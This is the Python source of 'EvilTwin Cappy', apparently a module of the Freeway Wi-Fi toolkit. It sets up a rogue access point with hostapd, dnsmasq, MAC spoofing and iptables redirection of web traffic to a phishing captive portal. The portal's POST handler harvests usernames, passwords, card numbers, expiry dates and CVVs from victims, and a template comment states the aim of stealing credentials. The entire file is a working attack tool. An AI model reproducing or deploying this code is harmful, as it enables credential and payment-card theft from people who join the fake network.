# EvilTwin Cappy
# by FLOCK4H
# v1.0.2

import os, shutil, time, sys, subprocess, json
from .colors import wprint, ColorCodes, iprint, cprint, cinput
from http.server import SimpleHTTPRequestHandler, HTTPServer
import threading
import random

try:
    from FreewayTools.git_downloader import download_folder_from_github

except ModuleNotFoundError:
    from git_downloader import download_folder_from_github

cc = ColorCodes()

script_dir = "/usr/local/share/3way"

def random_mac_address():
    mac = [0x00, 0x16, 0x3e,
           random.randint(0x00, 0x7f),
           random.randint(0x00, 0xff),
           random.randint(0x00, 0xff)]
    return ':'.join(map(lambda x: f"{x:02x}", mac))

def change_mac_address(interface, mac="random"):
    new_mac = random_mac_address() if mac == "random" else mac
    try:
        subprocess.run(['sudo', 'ifconfig', interface, 'down'], check=True)
        subprocess.run(['sudo', 'ifconfig', interface, 'hw', 'ether', new_mac], check=True)
        subprocess.run(['sudo', 'ifconfig', interface, 'up'], check=True)
        cprint(f"MAC address for {interface} changed to {new_mac}")
        time.sleep(1.2)
    except subprocess.CalledProcessError as e:
        print(f"Failed to change MAC address: {e}")

def check_dependencies(dependencies):
    temp_dir = f"/usr/local/share/3way/templates"
    if not os.path.exists(temp_dir) or os.listdir(temp_dir) == []:
        download_templates = cinput("/templates folder not installed! Download it now? (y/n)")
        if download_templates == "y":
            os.makedirs(temp_dir, exist_ok=True)
            download_folder_from_github("FLOCK4H", "Freeway", "templates", temp_dir)
        
    for dep in dependencies:
        result = subprocess.run(["which", dep], capture_output=True, text=True)
        if result.returncode != 0:
            wprint(f"{dep} is not installed. Please install {dep} and try again.")
            install = cinput(f"Install {dep} now? (Y/n)")
            if install.lower() == "y":
                if dep == "lighttpd":
                    os.system("sudo apt-get update")
                os.system(f"sudo apt-get install {dep}")
                cprint(f"{dep} successfully installed!")
                time.sleep(1.5)
        else:
            iprint(f"{dep} is installed.")
        time.sleep(0.2)

def mod_path(path, mod="copy"):
    if mod == "ren" and os.path.exists(f"{path}.copy"):
        os.remove(path)
        shutil.move(f"{path}.copy", path)

    if os.path.exists(path):
        shutil.copy(path, f"{path}.copy") 

def safecall(cmd, post_scriptum=""):
    result = os.system(cmd)
    if result != 0:
        if post_scriptum == "dnsmasq_issue":
            print(f"{cc.BLUE}Running 'sudo apt-get install dnsmasq' to fix dnsmasq!")
            os.system(f"sudo apt-get install dnsmasq")
        print(f"{cc.YELLOW}Catched command failure, but {cc.GREEN}continuing{cc.YELLOW}: {cmd}{cc.RESET}")
    return result

def delete_iptables_rule(table, rule):
    check_command = f"sudo iptables -t {table} -C {rule}"
    delete_command = f"sudo iptables -t {table} -D {rule}"
    if safecall(check_command) == 0:
        safecall(delete_command)

class Adapter:
    def __init__(self, inf=["wlan0"]):
        self.interfaces = inf
        self.interface = inf[0]
        self.init_adapter()

    def init_adapter(self, mode="managed"):
        try:
            for interface in self.interfaces:
                os.system(f'sudo iwconfig {interface} mode {mode}')
        except Exception as e:
            wprint(f"Error while putting interface in monitor mode: {e}")

class Config:
    def __init__(self, inf, ssid, channel, driver="nl80211", hw_mode="g", ip_addr="10.0.0.15"):
        self.interface = inf
        self.ssid = ssid
        self.channel = channel
        self.ip_addr = ip_addr
        self.ip_range = '.'.join(ip_addr.split('.')[:-1])
        cprint(f"Initialized with {self.ip_addr} {self.ip_range}-20-150")
        time.sleep(1)

        self.driver = driver
        self.hw_mode = hw_mode
        self.run_config()

    def run_config(self):
        cprint("Disconnecting from current network...")
        safecall(f"sudo nmcli device disconnect {self.interface[0] if self.interface else 'wlan0'}")

        if self.interface is None:
            self.interface = ["wlan0"]

        self.adapter = Adapter(inf=self.interface)
        self.wlan = self.adapter.interface

        mod_path(path="/etc/hostapd/hostapd.conf")
        mod_path(path="/etc/default/hostapd")
        mod_path(path="/etc/dnsmasq.conf")
        mod_path(path="/etc/network/interfaces")
        self.write_config(interface=self.wlan, ssid=self.ssid, channel=self.channel, driver=self.driver, hw_mode=self.hw_mode)

        self.write_to_config("/etc/default/hostapd", f"DAEMON_CONF=/etc/hostapd/hostapd.conf")
        self.write_to_config("/etc/dnsmasq.conf", f"""interface={self.wlan}\ndhcp-range={self.ip_range}.20,{self.ip_range}.150,12h""")
        self.write_to_config("/etc/network/interfaces", f"#")
    
    def ip_config(self, wlans):
        for wlan in wlans:
            iprint("Configuring IP adresses...")
            safecall(f"sudo ifconfig {wlan} {self.ip_addr} netmask 255.255.255.0 up")
            safecall(f"sudo sh -c \"echo 1 > /proc/sys/net/ipv4/ip_forward\"")
            safecall(f"sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE")
            safecall(f"sudo iptables -t nat -A PREROUTING -i {wlan} -p tcp --dport 80 -j DNAT --to-destination {self.ip_addr}")
            safecall(f"sudo iptables -A FORWARD -i {wlan} -p tcp --dport 80 -d {self.ip_addr} -j ACCEPT")

    def handle_services(self):
        safecall("sudo systemctl unmask hostapd")
        cprint("Hostapd was unmasked...")

        safecall(f"sudo systemctl stop dnsmasq", "dnsmasq_issue")
        cprint("Stopped dnsmasq")

        safecall(f"sudo systemctl stop hostapd")
        cprint("Stopped hostapd")

        safecall(f"sudo systemctl daemon-reload")
        iprint("Starting dnsmasq...")
        safecall(f"sudo systemctl start dnsmasq", "dnsmasq_issue")
        time.sleep(2)

    def handle_networking(self, wlans):
        for wlan in wlans:
            safecall(f"sudo ifconfig {wlan} up")
            iprint("Restarting networking service...")
            safecall(f"sudo systemctl restart networking")

    def write_config(self, **kwargs):
        interface = kwargs.pop("interface", "wlan0")
        driver = kwargs.pop("driver", "nl80211")
        ssid = kwargs.pop("ssid", "EvilTwin")
        hw_mode = kwargs.pop("hw_mode", "g")
        channel = str(kwargs.pop("channel", 10))
        macaddr_acl= kwargs.pop("macaddr_acl", "0")
        auth_algs = kwargs.pop("auth_algs", "1")
        ignore_broadcast_ssid = kwargs.pop("ignore_broadcast", "0")

        try:
            with open("/etc/hostapd/hostapd.conf", "w") as f:
                f.write(
    f"""interface={interface}
driver={driver}
ssid={ssid}
hw_mode={hw_mode}
channel={channel}
macaddr_acl={macaddr_acl}
auth_algs={auth_algs}
ignore_broadcast_ssid={ignore_broadcast_ssid}
logger_syslog=-1
logger_syslog_level=0
logger_stdout=-1
logger_stdout_level=0
""".lstrip()
                )
        except Exception as e:
            wprint(f'Error, couldn\'t save to the /etc/hostapd/hostapd.conf, {e}')
    
    def write_to_config(self, path, text):
        try:
            with open(path, "w") as f:
                f.write(text)
        except Exception as e:
            wprint(f'Error, couldn\'t save to the {path})')

def shutdown_network(wlans, ip_addr):
    for wlan in wlans:
        print("")
        iprint("Stopping dnsmasq...")
        safecall(f"sudo systemctl stop dnsmasq")
        iprint("Stopping hostapd...")
        safecall(f"sudo systemctl stop hostapd")

        safecall(f"sudo systemctl daemon-reload")
        iprint("Changing back the IP settings...")
        safecall(f"sudo sh -c \"echo 0 > /proc/sys/net/ipv4/ip_forward\"")
        delete_iptables_rule(f"nat", f"POSTROUTING -o eth0 -j MASQUERADE")
        delete_iptables_rule(f"nat", f"PREROUTING -i {wlan} -p tcp --dport 80 -j DNAT --to-destination {ip_addr}")
        delete_iptables_rule(f"filter", f"FORWARD -i {wlan} -p tcp --dport 80 -d {ip_addr} -j ACCEPT")

        mod_path(path="/etc/hostapd/hostapd.conf", mod="ren")
        mod_path(path="/etc/default/hostapd", mod="ren")
        mod_path(path="/etc/dnsmasq.conf", mod="ren")
        mod_path(path="/etc/network/interfaces", mod="ren")
        iprint("Original configs restored, restarting Network Manager..")
        safecall(f"sudo systemctl restart NetworkManager")

class CaptivePortalHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        try:
            if self.path == '/hotspot-detect.html':
                self.path = '/index.html'
            elif self.path == '/action.html':
                self.path = '/action.html'
            elif not os.path.exists(self.path[1:]):
                self.path = '/index.html'
            return SimpleHTTPRequestHandler.do_GET(self)
        except Exception as e:
            self.send_error(500, f"Internal server error: {str(e)}")

    def do_POST(self):
        try:
            if self.path == '/action.html':
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length)
                fields = dict(x.split('=') for x in post_data.decode().split('&'))
                username = fields.get('username', '')
                password = fields.get('password', '')
                credit_card = fields.get('credit', '')
                expiry_date = fields.get('expire', '')
                cvv = fields.get('cvv', '')
                if credit_card == '':
                    print(f"{cc.BRIGHT}{cc.GREEN}Captured credentials - {cc.BLUE}Username: {cc.WHITE}{username}, {cc.RED}Password: {cc.WHITE}{password}{cc.RESET}")
                else:
                    print(f"{cc.BRIGHT}{cc.GREEN}Captured credentials - {cc.CYAN}Card number: {credit_card}, Expire date: {expiry_date}, CVV: {cvv}")
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                with open('action.html', 'rb') as file:
                    self.wfile.write(file.read())
            elif self.path == '/data':
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length)
                data = json.loads(post_data.decode())
                print(f"{cc.BRIGHT}{cc.GREEN}Collected Data: {cc.WHITE}{data}{cc.RESET}")
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({'status': 'success'}).encode())
            else:
                self.send_response(404)
                self.end_headers()
        except Exception as e:
            self.send_error(500, f"Internal server error: {str(e)}")

    def handle_one_request(self):
        try:
            super().handle_one_request()
        except Exception as e:
            self.send_error(400, f"Bad request: {str(e)}")


class WebServer:
    def __init__(self, ip_addr):
        self.ip_addr = ip_addr
        server_thread = threading.Thread(target=self.start_captive_portal)
        server_thread.daemon = True
        server_thread.start()

    def get_template_name(self, template_dir):
        if os.path.exists(template_dir):
            templates = os.listdir(template_dir)
            cprint("Listing templates...")
            for i, item in enumerate(templates):
                cprint(f"{i}) {item}")
            temp_num = int(cinput("Enter template number"))
            if 0 <= temp_num < len(templates):
                return templates[temp_num]
        return None

    def start_captive_portal(self):
        templates_dir = f"{script_dir}/templates"
        if not os.path.exists(templates_dir):
            os.makedirs(templates_dir, exist_ok=True)
        choice_template = self.get_template_name(templates_dir)
        if choice_template:
            os.chdir(os.path.join(templates_dir, choice_template))
            handler = CaptivePortalHandler
            httpd = HTTPServer((self.ip_addr, 80), handler)
            iprint(f"Serving captive portal on {cc.GREEN}http://{self.ip_addr}:80 {cc.RESET}")
            print(cc.LIGHT_BLUE, cc.BRIGHT, "Evil Twin has started!", cc.BLUE)
            httpd.serve_forever()
        else:
            print("No valid template selected. Exiting.")

class ConfigManager:
    def __init__(self):
        self.config_file = os.path.join(script_dir, "_config")
        if not os.path.exists(f"{script_dir}/_config"):
            self.write_app_config(DEFAULT_APP="mousepad", SSID="Freeway WiFi", MAC="random", CHANNEL=6, HW_MODE="g", DRIVER="nl80211", IP="10.0.0.15")

    def get_config_value(self, key):
        if os.path.exists(f"{script_dir}/_config"):
            config_data = self.read_config()
            return config_data.get(key, "")

    def read_config(self):
        config_data = {}
        try:
            with open(self.config_file, "r") as f:
                for line in f:
                    key, value = line.strip().split("=", 1)
                    config_data[key] = value
        except Exception as e:
            wprint(f"Failed to read the configuration file! {e}")
        return config_data

    def write_app_config(self, **kwargs):
        config_data = {
            'DEFAULT_APP': kwargs.get('DEFAULT_APP', self.get_config_value("DEFAULT_APP")),
            'CHANNEL': kwargs.get('CHANNEL', self.get_config_value("CHANNEL")),
            'MAC': kwargs.get('MAC', self.get_config_value("MAC")),
            'HW_MODE': kwargs.get('HW_MODE', self.get_config_value("HW_MODE")),
            'DRIVER': kwargs.get('DRIVER', self.get_config_value("DRIVER")),
            'SSID': kwargs.get('SSID', self.get_config_value('SSID')),
            'IP': kwargs.get('IP', self.get_config_value('IP'))
        }
        try:
            with open(self.config_file, "w") as f:
                for key, value in config_data.items():
                    f.write(f"{key}={value}\n")
            cprint(f"Success, config modified. Sometimes you need to restart the app so the changes apply!")
            time.sleep(2)
        except Exception as e:
            wprint(f"Failed to write the configuration file! {e}")
            time.sleep(1)
        finally:
            self.default_app = self.get_config_value("DEFAULT_APP")

class Cappy:
    def __init__(self, interface, ssid="Freeway WiFi", channel=6, mac_addr="random"):
        self.interface = interface
        self.ssid = ssid
        self.channel = channel
        self.mac_addr = mac_addr
        cprint("Checking dependencies..")
        check_dependencies(["dnsmasq", "lighttpd", "hostapd"])
        self.check_dirs()
        self.config = ConfigManager()
        self.ip_addr = self.config.get_config_value("IP")
        self.run_cappy()
        self.post_init()

    def post_init(self):
        conf = Config(inf=self.interface, ssid=self.ssid, channel=self.channel, ip_addr=self.ip_addr)
        conf.ip_config(self.interface)
        conf.handle_services()
        conf.handle_networking(self.interface)

    def check_dirs(self):
        if not os.path.exists("/usr/local/share/3way/templates"):
            cprint("Creating templates dir...")
            os.makedirs("/usr/local/share/3way/templates")
            templates = ["Valentines", "mrhacker", "google", "mcd"]
            for template in templates:
                shutil.copytree(f"templates/{template}", f"/usr/local/share/3way/templates/{template}")
                
    def run_cappy(self):
        try:
            for interface in self.interface:
                change_mac_address(interface, mac=self.mac_addr)
            self.buy_orange_cappy()
            action = self.read_cappy_composition()
            self.template_path = "/usr/local/share/3way/templates"
            self.drink_healthy_juice(action)
        except KeyboardInterrupt:
            wprint("\nExiting..\n")
            sys.exit(0)

    def take_off_the_plastic_cap(self):
        self.buy_orange_cappy()
        action = self.read_cappy_composition()
        self.drink_healthy_juice(action)

    def buy_orange_cappy(self):
        os.system('clear')
        print(f"""
{cc.ORANGE}  _
{cc.GREEN} |c|   {cc.ORANGE}┏┓        
{cc.ORANGE}.'a`.  {cc.ORANGE}┃ ┏┓┏┓┏┓┓┏
{cc.GREEN}| p |  {cc.ORANGE}┗┛┗┻┣┛┣┛┗┫
{cc.ORANGE}| p |  {cc.ORANGE}    ┛ ┛  ┛        
{cc.ORANGE}|_y_|         {cc.BRIGHT}{cc.GREEN}healthy diet, {cc.RED}happy{cc.GREEN} stomach.{cc.RESET}
                {cc.BRIGHT}{cc.MAGENTA}by FLOCK4H{cc.RESET}
""")
        time.sleep(1)

    def read_cappy_composition(self):
        actions = {1: "Start", 2: "Create Template", 3: "Edit Template", 4: "Remove Template", 5: "List Templates", 6: "Edit Config"}
        for index, action in actions.items():
            cprint(f"{index}) {action}")
        decision = cinput(f"{cc.BRIGHT}[CAPPY]", color=cc.CYAN)
        return decision
    
    def throw_away_plastic_bottle(self):
        pass

    def drink_healthy_juice(self, action):
        if action == "1":
            return
        elif action == "2":
            name = cinput("Name the template")
            self.create_new_template(name)
            iprint("Template created! Path: /usr/local/share/3way/templates/{} \ Name: {}".format(name, name))
            time.sleep(2)
        elif action == "3":
            self.mod_template("edit")
        elif action == "4":
            self.mod_template("remove")
        elif action == "5":
            self.mod_template("list")
        elif action == "6":
            self.edit_config()
        
        self.take_off_the_plastic_cap()

    def edit_config(self):
        print("")
        changable = {1: "SSID", 2: "MAC", 3: "HW_MODE", 4: "DRIVER", 5: "CHANNEL", 6: "DEFAULT_APP", 7: "IP"}
        for idx, o in changable.items():
            cprint(f"{idx}) {o}")
        modify = cinput("Enter index to modify")
        for idx, o in changable.items():
            if modify == str(idx):
                self.modify_value(o)

    def modify_value(self, v):
        new_val = cinput(f"Enter new value of {v}")
        self.config.write_app_config(**{v: new_val})
        if v == "IP":
            self.ip_addr = new_val
        cprint(f"Changed {v} to {new_val}!")
        time.sleep(1)

    def mod_template(self, mod):
        if mod == "edit":
            self.default_app = self.config.default_app
            name = cinput("Enter name of the template to edit")
            template_path = f"{self.template_path}/{name}"
            try:
                if os.path.exists(template_path):
                    cprint(f"Found the template! Using {self.default_app} to edit, press Ctrl+C to change the default program.")
                    time.sleep(2)
                    cmd = f"{self.default_app} {template_path}/index.html".replace("\n", "").strip(" ")
                    cprint(cmd)
                    time.sleep(2)
                    os.system(cmd)
                else:
                    wprint("Couldn't find the template of name {}".format(name))
            except KeyboardInterrupt:
                name = cinput("Enter name of a program to set as default (e.g., nano, code, geany, thonny)")
                self.config.write_app_config(DEFAULT_APP=name)
                iprint("Changes applied, restart the app.")
                sys.exit(0)
        elif mod == "list":
            for item in os.listdir(self.template_path):
                cprint(item)
            time.sleep(3)
        elif mod == "remove":
            name = cinput("Name of the template to remove")
            for item in os.listdir(self.template_path):
                if item == name.strip():
                    shutil.rmtree(os.path.join(self.template_path, item))
                    iprint("Successfully removed {} template.".format(name))
                    time.sleep(2)
                    return
            wprint("Coulnd't find a template with this name")
            time.sleep(1.5)
            
    def create_new_template(self, name):
        try:
            if not os.path.exists(f"{self.template_path}/{name}"):
                os.makedirs(f"{self.template_path}/{name}")
            with open(f"{self.template_path}/{name}/index.html", "w") as f:
                f.write("<html><h1>Here put the HTML content of the site, this file is the first site that user will see after associating.</h1></html>")
            with open(f"{self.template_path}/{name}/action.html", "w") as f:
                f.write("""<html><h1>
    <!-- Here goes the code after submitting the form, 
    in order to steal credentials, we must add 'form' tag with 
    'username', 'password', 'submit' tags to the index.html file -->
    Hello! 
</h1></html>""")
        
        except Exception as e:
            wprint("Exception in 'create_new_template'", e)